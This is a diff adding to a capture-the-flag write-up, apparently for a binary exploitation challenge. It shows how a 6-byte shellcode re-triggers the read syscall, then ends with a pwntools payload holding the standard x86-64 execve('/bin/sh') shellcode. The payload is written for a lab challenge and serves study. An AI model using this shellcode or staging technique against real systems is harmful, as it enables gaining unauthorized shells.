@@ -42,3 +42,53 @@ But, we still don't know what to put for a 6-byte shellcode.
 
 Now, it is time for `gdb-peda` and check what are in the registers at the time `yuawn()`, which is our shellcode, is going to run:
 
+  ![gdb-peda](gdb-peda.jpg)
+  
+And we can find something interesting...
+
+First, under Linux x86-64 environment, the id and parameters for system call `read` are:
+
+  * rax = 0
+  * rdi = 0
+  * rsi = pointer to store
+  * rdx = length to read
+  
+From gdp-peda, we can see:
+
+  * rax = 0
+  * rdi = 0x1
+  * rsi = 0x7fff7dd26a3
+  * rdx = 0x601059
+  
+Wow! They are almost the same!  
+
+What we need to do is make rdi = 0 and make rsi = 0x601059 to read again. (rdx does not matter since we do not have a read limit)
+
+With the help of [online assembler](http://shell-storm.org/online/Online-Assembler-and-Disassembler/), I was able to find a 6-byte shellcode to execute read.
+
+First, of course, `syscall` is needed, which is `\x0f\x05`. So, 4 more bytes are needed before it.
+
+Next, an easy one -- make rdi = 0. I tried `mov rdi, 0` `mov edi, 0` `mov dil, 0` these are still too long. 
+
+Then I remeber one `dec edi`, which will be `\xff\xcf`, perfect!   
+  * Note: I later found out that `xor edi, edi` is also 2 bytes
+  
+Finally, last part: make rsi = 0x601059. This was hard, but after googling, I found a method that I could try -- `xchg`.
+So, `xchg edx,esi`, which is `"\x87\xf2"`, hmmmmm 2 bytes!
+
+So, the 6-byte shellcode will be:
+
+    "\x87\xf2\xff\xcf\x0f\x05" 
+    
+When `yuawn()` runs the shellcode it will start another read, which will look like `read(0, code, a large number)`. Therefore, we need to overwrite the original 6-byte shellcode with padding first, then follow up with the shellcod used in the previous question.
+
+In the end, the playload will look like:
+
+  ```python
+  p.sendline(b"\x87\xf2\xff\xcf\x0f\x05"+ b"\x90"*6 +
+	   b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
+  ```
+  
+    
+
+
